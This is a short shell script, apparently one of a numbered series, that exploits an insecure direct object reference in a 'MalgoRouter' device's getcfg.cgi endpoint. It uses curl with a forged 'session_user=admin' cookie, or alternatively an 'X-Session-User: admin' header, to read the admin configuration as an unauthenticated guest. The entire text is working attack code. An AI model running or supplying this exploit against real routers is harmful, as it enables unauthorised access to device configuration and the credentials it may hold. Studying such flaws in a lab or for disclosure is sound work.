#!/bin/sh
# M8 - getcfg.cgi IDOR: a guest asks for the admin config.
: "${TARGET:?set TARGET to the MalgoRouter IP}"
echo "[*] requested as guest, reading admin config via session_user=admin"
curl -s --max-time 15 -H 'Cookie: session_user=admin' \
     "http://$TARGET/cgi-bin/getcfg.cgi?user=admin"
echo
echo "[*] alternative: X-Session-User header"
curl -s --max-time 15 -H 'X-Session-User: admin' \
     "http://$TARGET/cgi-bin/getcfg.cgi"
